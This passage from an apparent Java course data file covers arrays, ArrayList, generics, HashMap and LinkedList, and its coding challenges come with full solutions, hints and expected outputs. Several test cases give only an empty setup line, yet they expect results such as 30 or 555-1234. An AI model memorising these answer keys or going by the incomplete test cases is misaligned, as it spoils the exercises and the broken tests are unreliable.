              "content": "ArrayIndexOutOfBoundsException:\nint[] arr = new int[5];\narr[5] = 10;  // CRASH! Valid indexes are 0-4\n\nArrays start at 0, so arr[arr.length] is ALWAYS invalid.\n\nFixed size cannot change:\nint[] arr = new int[3];\n// Cannot add a 4th element - use ArrayList instead!\n\nDefault values:\n- int[]: all zeros\n- boolean[]: all false\n- Object[]: all null (NullPointerException risk!)\n\nFor dynamic sizing, prefer ArrayList over arrays."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-1-sum",
              "title": "Sum Array Elements",
              "description": "Given an array: {5, 10, 15, 20, 25}\n\nUse a for loop to calculate the sum of all elements.\nPrint the total sum.\n\nExpected output: 75",
              "instructions": "Given an array: {5, 10, 15, 20, 25}\n\nUse a for loop to calculate the sum of all elements.\nPrint the total sum.\n\nExpected output: 75",
              "starterCode": "// Sum Array Elements\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Sum Array Elements\n// This demonstrates looping through an array to calculate a sum\n\nvoid main() {\n    // Create the array with the given values\n    int[] numbers = {5, 10, 15, 20, 25};\n    \n    // Variable to accumulate the sum\n    var sum = 0;\n    \n    // Loop through each element in the array\n    for (var i = 0; i < numbers.length; i++) {\n        sum += numbers[i];  // Add each element to sum\n    }\n    \n    // Print the total sum\n    println(sum);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-1-sum-test-1",
                  "description": "Should calculate sum = 75",
                  "expectedOutput": "75",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 2,
                  "text": "Use a for loop or while loop to repeat the operation."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-3-lesson-2",
          "title": "Lesson 5.2: ArrayList - Arrays That Grow",
          "moduleId": "module-05",
          "order": 2,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Fixed-Size Arrays",
              "content": "Remember arrays?\n\nint[] numbers = new int[5];  // Size is FIXED at 5\n\nProblems:\n1. What if you need to add a 6th element? Can't do it!\n2. What if you need to remove an element? Have to shift manually\n3. No built-in methods for common operations\n\nExample:\nYou're building a to-do list app. How many tasks will users have?\n- Could be 0\n- Could be 5\n- Could be 100\n\nYou CAN'T predict the size!\n\nSolution: ArrayList - a dynamic, resizable array!"
            },
            {
              "type": "KEY_POINT",
              "title": "ArrayList is Like an Accordion Folder",
              "content": "FIXED ARRAY:\n= Box with 5 compartments\n- Can hold exactly 5 items\n- Want to add a 6th? Too bad!\n- Want to remove one? Empty slot remains\n\nARRAYLIST:\n= Accordion folder\n- Starts with some capacity\n- Add items → expands automatically\n- Remove items → shrinks, no gaps\n- Has methods: add(), remove(), get(), size()\n\nArrayList handles resizing for you!"
            },
            {
              "type": "THEORY",
              "title": "ArrayList Syntax and Operations",
              "content": "IMPORT:\nimport java.util.ArrayList;\n\nCREATING:\nArrayList<String> names = new ArrayList<>();\n// <String> = type parameter (ArrayList of Strings)\n\nADDING ELEMENTS:\nnames.add(\"Alice\");  // [\"Alice\"]\nnames.add(\"Bob\");    // [\"Alice\", \"Bob\"]\nnames.add(\"Carol\");  // [\"Alice\", \"Bob\", \"Carol\"]\n\nACCESSING:\nnames.get(0);  // \"Alice\" (like array[0])\nnames.get(1);  // \"Bob\"\n\nSIZE:\nnames.size();  // 3 (NOT .length like arrays)\n\nREMOVING:\nnames.remove(1);  // Remove \"Bob\"\n// Now: [\"Alice\", \"Carol\"] - automatically shifts!\n\nCHECKING:\nnames.contains(\"Alice\");  // true\nnames.isEmpty();  // false"
            },
            {
              "type": "THEORY",
              "title": "Understanding Generics: Type Parameters",
              "content": "The <String> in ArrayList<String> is a TYPE PARAMETER (generics).\n\nWITHOUT GENERICS (old Java):\nArrayList list = new ArrayList();  // Raw type - AVOID!\nlist.add(\"hello\");\nlist.add(123);  // No error! Mixed types = bugs later\nString s = (String) list.get(1);  // CRASH at runtime!\n\nWITH GENERICS:\nArrayList<String> list = new ArrayList<String>();\nlist.add(\"hello\");\nlist.add(123);  // Compile error! Caught early\nString s = list.get(0);  // No cast needed\n\nDIAMOND OPERATOR (Java 7+):\nArrayList<String> names = new ArrayList<>();  // <> infers type\n// Compiler knows it's ArrayList<String> from left side\n\nMULTIPLE TYPE PARAMETERS:\nHashMap<String, Integer> ages = new HashMap<>();\n// K=String (key), V=Integer (value)\n\nBOUNDED TYPES (advanced):\nList<? extends Number> nums;  // Any Number subtype (Integer, Double...)\nList<? super Integer> items;  // Integer or its supertypes"
            },
            {
              "type": "THEORY",
              "title": "ArrayList vs Array: Key Differences",
              "content": "ARRAY:\nint[] arr = new int[5];\n- Fixed size: 5 elements forever\n- Access: arr[0]\n- Length: arr.length\n- Can hold primitives (int, double, char)\n\nARRAYLIST:\nArrayList<Integer> list = new ArrayList<>();\n- Dynamic size: grows/shrinks\n- Access: list.get(0)\n- Length: list.size()\n- Only holds objects (Integer, String, not int)\n\nAUTOBOXING (automatic conversion):\nArrayList<Integer> nums = new ArrayList<>();\nnums.add(5);  // int 5 → Integer 5 (autoboxing)\nint x = nums.get(0);  // Integer → int (auto-unboxing)"
            },
            {
              "type": "KEY_POINT",
              "title": "Common ArrayList Methods",
              "content": "ADDING:\n- add(item) → adds to end\n- add(index, item) → inserts at position\n\nREMOVING:\n- remove(index) → removes at position\n- remove(object) → removes first occurrence\n- clear() → removes all\n\nACCESSING:\n- get(index) → retrieves element\n- set(index, item) → replaces element\n\nQUERYING:\n- size() → number of elements\n- isEmpty() → true if empty\n- contains(item) → true if found\n- indexOf(item) → position of item (-1 if not found)\n\nLOOPING:\nfor (int i = 0; i < list.size(); i++) {\n    System.out.println(list.get(i));\n}\n\n// Enhanced for loop (easier!)\nfor (String item : list) {\n    System.out.println(item);\n}"
            },
            {
              "type": "WARNING",
              "title": "ArrayList Gotchas",
              "content": "IndexOutOfBoundsException:\nArrayList<String> list = new ArrayList<>();\nlist.get(0);  // CRASH! List is empty\nAlways check size() before accessing by index.\n\nRemove while iterating (ConcurrentModificationException):\nfor (String s : list) {\n    if (condition) list.remove(s);  // CRASH!\n}\nUse removeIf() instead:\nlist.removeIf(s -> s.startsWith(\"test\"));\n\nPrimitive remove() confusion:\nArrayList<Integer> nums = new ArrayList<>();\nnums.add(1); nums.add(2);\nnums.remove(1);  // Removes at INDEX 1, not value 1!\nnums.remove(Integer.valueOf(1));  // Removes VALUE 1\n\nJava 21+ Sequenced Collections:\nArrayList now supports getFirst(), getLast(), addFirst(), reversed()."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-2-todo",
              "title": "Simple To-Do List",
              "description": "Create a ToDoList class with:\n- ArrayList<String> field named tasks\n- Constructor that initializes tasks\n- addTask(String task) method\n- getTaskCount() method returning number of tasks\n- getTask(int index) method",
              "instructions": "Create a ToDoList class with:\n- ArrayList<String> field named tasks\n- Constructor that initializes tasks\n- addTask(String task) method\n- getTaskCount() method returning number of tasks\n- getTask(int index) method",
              "starterCode": "import java.util.ArrayList;\n\npublic class ToDoList {\n    // Your code here\n}",
              "solution": "// Solution: Simple To-Do List\n// This demonstrates using ArrayList for dynamic storage\n\nimport java.util.ArrayList;\n\npublic class ToDoList {\n    // ArrayList to store tasks\n    ArrayList<String> tasks;\n    \n    // Constructor initializes the ArrayList\n    public ToDoList() {\n        tasks = new ArrayList<>();\n    }\n    \n    // Add a task to the list\n    public void addTask(String task) {\n        tasks.add(task);\n    }\n    \n    // Get the number of tasks\n    public int getTaskCount() {\n        return tasks.size();\n    }\n    \n    // Get a task by index\n    public String getTask(int index) {\n        return tasks.get(index);\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-2-todo-test-1",
                  "description": "ToDoList list = new ToDoList();\nreturn list.getTaskCount();",
                  "expectedOutput": "0",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-2-todo-test-2",
                  "description": "ToDoList list = new ToDoList();\nlist.addTask(\"Buy milk\");\nreturn list.getTaskCount();",
                  "expectedOutput": "1",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-2-todo-test-3",
                  "description": "ToDoList list = new ToDoList();\nlist.addTask(\"Task 1\");\nlist.addTask(\"Task 2\");\nreturn list.getTask(1);",
                  "expectedOutput": "Task 2",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-2-numbers",
              "title": "Sum of ArrayList",
              "description": "Create a class with a method sumList(ArrayList<Integer> nums) that:\n- Takes an ArrayList of integers\n- Returns the sum of all numbers",
              "instructions": "Create a class with a method sumList(ArrayList<Integer> nums) that:\n- Takes an ArrayList of integers\n- Returns the sum of all numbers",
              "starterCode": "import java.util.ArrayList;\n\npublic class ListCalculator {\n    public static int sumList(ArrayList<Integer> nums) {\n        // Your code here\n    }\n}",
              "solution": "// Solution: Sum of ArrayList\n// This demonstrates iterating through an ArrayList\n\nimport java.util.ArrayList;\n\npublic class ListCalculator {\n    public static int sumList(ArrayList<Integer> nums) {\n        // Variable to accumulate sum\n        int sum = 0;\n        \n        // Enhanced for loop - easier way to iterate\n        for (int num : nums) {\n            sum += num;\n        }\n        \n        return sum;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-2-numbers-test-1",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "30",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-2-numbers-test-2",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "10",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-2-numbers-test-3",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "0",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-2-search",
              "title": "Find and Remove",
              "description": "Create a class with method removeNegatives(ArrayList<Integer> nums) that:\n- Takes an ArrayList of integers\n- Removes all negative numbers\n- Returns the modified list",
              "instructions": "Create a class with method removeNegatives(ArrayList<Integer> nums) that:\n- Takes an ArrayList of integers\n- Removes all negative numbers\n- Returns the modified list",
              "starterCode": "import java.util.ArrayList;\n\npublic class ListFilter {\n    public static ArrayList<Integer> removeNegatives(ArrayList<Integer> nums) {\n        // Your code here\n    }\n}",
              "solution": "// Solution: Find and Remove\n// This demonstrates removing elements from an ArrayList\n\nimport java.util.ArrayList;\n\npublic class ListFilter {\n    public static ArrayList<Integer> removeNegatives(ArrayList<Integer> nums) {\n        // Create a new ArrayList for positive numbers\n        ArrayList<Integer> result = new ArrayList<>();\n        \n        // Only add non-negative numbers to result\n        for (int num : nums) {\n            if (num >= 0) {\n                result.add(num);\n            }\n        }\n        \n        return result;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-2-search-test-1",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "2",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-2-search-test-2",
                  "description": "ArrayList<Integer> nums = new ArrayList<>();\n",
                  "expectedOutput": "15",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-3-lesson-3",
          "title": "Lesson 5.3: HashMap - Looking Up by Name",
          "moduleId": "module-05",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Finding Data by Index is Limiting",
              "content": "With ArrayList, you access by INDEX:\n\nArrayList<String> students = new ArrayList<>();\nstudents.add(\"Alice\");  // index 0\nstudents.add(\"Bob\");    // index 1\n\nTo find Bob, you need to:\n- Loop through entire list\n- Check each name\n- Remember which index was Bob\n\nReal-world scenarios:\n- Look up a phone number by NAME (not position)\n- Find product price by SKU code\n- Get user profile by username\n\nYou need: KEY → VALUE lookup\n\nSolution: HashMap!"
            },
            {
              "type": "KEY_POINT",
              "title": "HashMap is Like a Dictionary",
              "content": "ENGLISH DICTIONARY:\n- Look up \"apple\" (KEY)\n- Get definition: \"a round fruit...\" (VALUE)\n- Don't need to know page number\n- Direct lookup!\n\nJAVA HASHMAP:\nHashMap<String, String> phonebook = new HashMap<>();\nphonebook.put(\"Alice\", \"555-1234\");  // KEY → VALUE\nphonebook.put(\"Bob\", \"555-5678\");\n\nString aliceNumber = phonebook.get(\"Alice\");  // \"555-1234\"\n\nFast lookup by KEY, not index!"
            },
            {
              "type": "THEORY",
              "title": "HashMap Syntax and Operations",
              "content": "IMPORT:\nimport java.util.HashMap;\n\nCREATING:\nHashMap<String, Integer> ages = new HashMap<>();\n// <KeyType, ValueType>\n\nADDING/UPDATING:\nages.put(\"Alice\", 25);  // Add Alice → 25\nages.put(\"Bob\", 30);    // Add Bob → 30\nages.put(\"Alice\", 26);  // UPDATE Alice to 26 (overwrites)\n\nGETTING VALUES:\nages.get(\"Alice\");  // 26\nages.get(\"Bob\");    // 30\nages.get(\"Carol\");  // null (not found)\n\nCHECKING:\nages.containsKey(\"Alice\");  // true\nages.containsValue(30);  // true\nages.isEmpty();  // false\n\nREMOVING:\nages.remove(\"Bob\");  // Remove Bob's entry\n\nSIZE:\nages.size();  // 1 (only Alice remains)"
            },
            {
              "type": "THEORY",
              "title": "Looping Through a HashMap",
              "content": "You can iterate over KEYS, VALUES, or ENTRIES:\n\nHashMap<String, Integer> scores = new HashMap<>();\nscores.put(\"Alice\", 95);\nscores.put(\"Bob\", 87);\nscores.put(\"Carol\", 92);\n\n// METHOD 1: Loop through keys\nfor (String name : scores.keySet()) {\n    System.out.println(name + \": \" + scores.get(name));\n}\n\n// METHOD 2: Loop through entries (KEY-VALUE pairs)\nfor (Map.Entry<String, Integer> entry : scores.entrySet()) {\n    System.out.println(entry.getKey() + \": \" + entry.getValue());\n}\n\n// METHOD 3: Loop through values only\nfor (Integer score : scores.values()) {\n    System.out.println(score);\n}\n\nNote: HashMap does NOT maintain order (use LinkedHashMap for order)"
            },
            {
              "type": "KEY_POINT",
              "title": "HashMap Performance and Use Cases",
              "content": "PERFORMANCE:\n- put(key, value): O(1) average - FAST!\n- get(key): O(1) average - FAST!\n- containsKey(key): O(1) average - FAST!\n\nCompare to ArrayList search: O(n) - must check every element\n\nWHEN TO USE HASHMAP:\n✓ Need fast lookup by key\n✓ Key-value associations (username → profile)\n✓ Counting occurrences (word → count)\n✓ Caching results (input → output)\n\nWHEN NOT TO USE:\n✗ Need to maintain order (use LinkedHashMap)\n✗ Need sorting (use TreeMap)\n✗ Just storing a list of items (use ArrayList)"
            },
            {
              "type": "THEORY",
              "title": "⚠️ HashMap Keys Must Be Unique",
              "content": "HashMap<String, Integer> map = new HashMap<>();\nmap.put(\"Alice\", 25);\nmap.put(\"Bob\", 30);\nmap.put(\"Alice\", 26);  // OVERWRITES previous Alice value!\n\nSystem.out.println(map.get(\"Alice\"));  // 26 (not 25)\nSystem.out.println(map.size());  // 2 (not 3)\n\nEach KEY can only appear ONCE.\nIf you put() with an existing key, it REPLACES the value.\n\nBut VALUES can be duplicated:\nmap.put(\"Carol\", 30);  // Same value as Bob - totally fine!"
            },
            {
              "type": "WARNING",
              "title": "HashMap Pitfalls",
              "content": "NullPointerException with get():\nHashMap<String, Integer> map = new HashMap<>();\nint value = map.get(\"missing\");  // CRASH! get() returns null, auto-unboxing fails\n\nUse getOrDefault() instead:\nint value = map.getOrDefault(\"missing\", 0);\n\nMutable keys are dangerous:\nIf you modify a key object after insertion, you cannot find it again!\n\nNo ordering guarantee:\nHashMap does NOT maintain insertion order.\nUse LinkedHashMap for insertion order.\nUse TreeMap for sorted key order.\n\nJava 21+ Note:\nHashMap does NOT implement SequencedMap (no ordering).\nLinkedHashMap does implement SequencedMap with getFirst(), getLast()."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-3-phonebook",
              "title": "Simple Phonebook",
              "description": "Create a Phonebook class with:\n- HashMap<String, String> field named contacts (name → phone)\n- Constructor that initializes contacts\n- addContact(String name, String phone) method\n- getPhone(String name) method returning the phone number",
              "instructions": "Create a Phonebook class with:\n- HashMap<String, String> field named contacts (name → phone)\n- Constructor that initializes contacts\n- addContact(String name, String phone) method\n- getPhone(String name) method returning the phone number",
              "starterCode": "import java.util.HashMap;\n\npublic class Phonebook {\n    // Your code here\n}",
              "solution": "// Solution: Simple Phonebook\n// This demonstrates using HashMap for key-value storage\n\nimport java.util.HashMap;\n\npublic class Phonebook {\n    // HashMap to store name -> phone number mappings\n    HashMap<String, String> contacts;\n    \n    // Constructor initializes the HashMap\n    public Phonebook() {\n        contacts = new HashMap<>();\n    }\n    \n    // Add a contact\n    public void addContact(String name, String phone) {\n        contacts.put(name, phone);\n    }\n    \n    // Get phone number by name (returns null if not found)\n    public String getPhone(String name) {\n        return contacts.get(name);\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-3-phonebook-test-1",
                  "description": "Phonebook pb = new Phonebook();\n",
                  "expectedOutput": "555-1234",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-3-phonebook-test-2",
                  "description": "Phonebook pb = new Phonebook();\n",
                  "expectedOutput": "555-9999",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-3-phonebook-test-3",
                  "description": "Phonebook pb = new Phonebook();\n",
                  "expectedOutput": "null",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-3-inventory",
              "title": "Product Inventory",
              "description": "Create an Inventory class with:\n- HashMap<String, Integer> field named stock (product → quantity)\n- Constructor that initializes stock\n- addProduct(String product, int quantity) method\n- getStock(String product) method returning quantity (or 0 if not found)\n- hasProduct(String product) method returning boolean",
              "instructions": "Create an Inventory class with:\n- HashMap<String, Integer> field named stock (product → quantity)\n- Constructor that initializes stock\n- addProduct(String product, int quantity) method\n- getStock(String product) method returning quantity (or 0 if not found)\n- hasProduct(String product) method returning boolean",
              "starterCode": "import java.util.HashMap;\n\npublic class Inventory {\n    // Your code here\n}",
              "solution": "// Solution: Product Inventory\n// This demonstrates HashMap with containsKey and default values\n\nimport java.util.HashMap;\n\npublic class Inventory {\n    // HashMap to store product -> quantity mappings\n    HashMap<String, Integer> stock;\n    \n    // Constructor initializes the HashMap\n    public Inventory() {\n        stock = new HashMap<>();\n    }\n    \n    // Add a product with quantity\n    public void addProduct(String product, int quantity) {\n        stock.put(product, quantity);\n    }\n    \n    // Get stock quantity (returns 0 if product not found)\n    public int getStock(String product) {\n        // Use getOrDefault to return 0 if product doesn't exist\n        return stock.getOrDefault(product, 0);\n    }\n    \n    // Check if product exists\n    public boolean hasProduct(String product) {\n        return stock.containsKey(product);\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-3-inventory-test-1",
                  "description": "Inventory inv = new Inventory();\n",
                  "expectedOutput": "50",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-3-inventory-test-2",
                  "description": "Inventory inv = new Inventory();\n",
                  "expectedOutput": "true",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-3-inventory-test-3",
                  "description": "Inventory inv = new Inventory();\n",
                  "expectedOutput": "false",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-3-inventory-test-4",
                  "description": "Inventory inv = new Inventory();\n",
                  "expectedOutput": "0",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-3-lesson-3-wordcount",
              "title": "Word Frequency Counter",
              "description": "Create a class with method countWords(String[] words) that:\n- Takes an array of words\n- Returns HashMap<String, Integer> where key=word, value=count\nExample: [\"apple\", \"banana\", \"apple\"] → {\"apple\": 2, \"banana\": 1}",
              "instructions": "Create a class with method countWords(String[] words) that:\n- Takes an array of words\n- Returns HashMap<String, Integer> where key=word, value=count\nExample: [\"apple\", \"banana\", \"apple\"] → {\"apple\": 2, \"banana\": 1}",
              "starterCode": "import java.util.HashMap;\n\npublic class WordCounter {\n    public static HashMap<String, Integer> countWords(String[] words) {\n        // Your code here\n    }\n}",
              "solution": "// Solution: Word Frequency Counter\n// This demonstrates using HashMap for counting occurrences\n\nimport java.util.HashMap;\n\npublic class WordCounter {\n    public static HashMap<String, Integer> countWords(String[] words) {\n        // Create HashMap to store word counts\n        HashMap<String, Integer> counts = new HashMap<>();\n        \n        // Loop through each word in the array\n        for (String word : words) {\n            // If word already exists, increment count\n            // If not, start count at 1\n            if (counts.containsKey(word)) {\n                counts.put(word, counts.get(word) + 1);\n            } else {\n                counts.put(word, 1);\n            }\n        }\n        \n        return counts;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-3-lesson-3-wordcount-test-1",
                  "description": "String[] words = {\"apple\", \"banana\", \"apple\"};\n",
                  "expectedOutput": "2",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-3-wordcount-test-2",
                  "description": "String[] words = {\"apple\", \"banana\", \"apple\"};\n",
                  "expectedOutput": "1",
                  "isVisible": true
                },
                {
                  "id": "epoch-3-lesson-3-wordcount-test-3",
                  "description": "String[] words = {\"cat\", \"dog\", \"cat\", \"bird\", \"dog\", \"cat\"};\n",
                  "expectedOutput": "3",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-3-lesson-4",
          "title": "Lesson 5.4: LinkedList - A Different Kind of List",
          "moduleId": "module-05",
          "order": 4,
          "estimatedMinutes": 35,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: ArrayList Insertion is Slow",
              "content": "ArrayList stores elements in a continuous block:\n\n[0] [1] [2] [3] [4]\n\nWhat happens when you INSERT in the middle?\n\nlist.add(2, \"NEW\");  // Insert at index 2\n\nArrayList must:\n1. Shift element at index 2 to index 3\n2. Shift element at index 3 to index 4\n3. Shift element at index 4 to index 5\n4. THEN insert \"NEW\" at index 2\n\nFor 1 million elements, this is SLOW! O(n) time\n\nLinkedList solves this differently!"
            },
            {
              "type": "KEY_POINT",
              "title": "LinkedList is Like a Chain of People Holding Hands",
              "content": "ARRAYLIST:\n= People standing in numbered spots\n[Person 0] [Person 1] [Person 2] [Person 3]\n- To add someone in middle: everyone shifts spots\n- Access by position: very fast (just go to spot 2)\n\nLINKEDLIST:\n= Chain of people holding hands\n(Alice) → (Bob) → (Carol) → (Dave)\n- Each person holds hand of next person\n- To insert: break one handhold, insert new person, reconnect\n- Access by position: must walk from start (slower)\n\nLinkedList: Fast insertion, slower access\nArrayList: Slower insertion, fast access"
            },
            {
              "type": "THEORY",
              "title": "LinkedList Syntax",
              "content": "IMPORT:\nimport java.util.LinkedList;\n\nCREATING:\nLinkedList<String> names = new LinkedList<>();\n\nLinkedList has ALL ArrayList methods:\nnames.add(\"Alice\");\nnames.add(\"Bob\");\nnames.get(0);  // \"Alice\"\nnames.remove(1);  // Remove Bob\n\nPLUS special methods for ends:\nnames.addFirst(\"First\");  // Add to beginning\nnames.addLast(\"Last\");    // Add to end\nnames.getFirst();  // Get first element\nnames.getLast();   // Get last element\nnames.removeFirst();  // Remove first\nnames.removeLast();   // Remove last\n\nThese operations are O(1) - VERY FAST!"
            },
            {
              "type": "THEORY",
              "title": "ArrayList vs LinkedList: Performance Comparison",
              "content": "OPERATION          | ArrayList | LinkedList\n-------------------|-----------|-----------\nget(index)         | O(1) ✓    | O(n) ✗\nadd(element)       | O(1) ✓    | O(1) ✓\nadd(index, elem)   | O(n) ✗    | O(n) ~\naddFirst(elem)     | O(n) ✗    | O(1) ✓\naddLast(elem)      | O(1) ✓    | O(1) ✓\nremove(index)      | O(n) ✗    | O(n) ~\nremoveFirst()      | O(n) ✗    | O(1) ✓\nremoveLast()       | O(1) ✓    | O(1) ✓\n\nO(1) = Constant time (FAST)\nO(n) = Linear time (scales with size)\n\nSUMMARY:\nArrayList: Fast random access, slow insertions\nLinkedList: Slow random access, fast insertions at ends"
            },
            {
              "type": "KEY_POINT",
              "title": "When to Use Each Collection",
              "content": "USE ARRAYLIST WHEN:\n✓ You access elements by index frequently\n✓ You mostly add to the end\n✓ You iterate through all elements\n✓ MOST COMMON USE CASE (default choice)\n\nExample: Displaying a list of products\n\nUSE LINKEDLIST WHEN:\n✓ You frequently insert/remove at the beginning\n✓ You implement a Queue (FIFO)\n✓ You implement a Stack (LIFO)\n✓ You rarely access by index\n\nExample: Task queue where tasks are added/removed from front\n\nUSE HASHMAP WHEN:\n✓ You need key-value pairs\n✓ You need fast lookup by key\n✓ Order doesn't matter\n\nExample: User profiles by username\n\nRULE OF THUMB: Start with ArrayList unless you have a reason not to!"
            },
            {
              "type": "THEORY",
              "title": "💻 Queue Example with LinkedList",
